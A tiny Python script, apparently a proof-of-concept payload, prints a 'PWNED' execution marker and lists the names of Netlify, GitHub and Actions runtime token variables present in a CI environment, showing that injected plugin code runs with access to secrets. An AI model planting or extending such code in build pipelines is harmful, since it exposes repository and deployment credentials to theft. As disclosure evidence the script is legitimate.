import os
print("PWNED_GE_PLUGIN_EXECUTED")
print("PRIV_ENV_KEYS=" + ",".join(sorted(k for k in os.environ if ("NETLIFY" in k) or k in ("GITHUB_TOKEN","ACTIONS_RUNTIME_TOKEN"))))
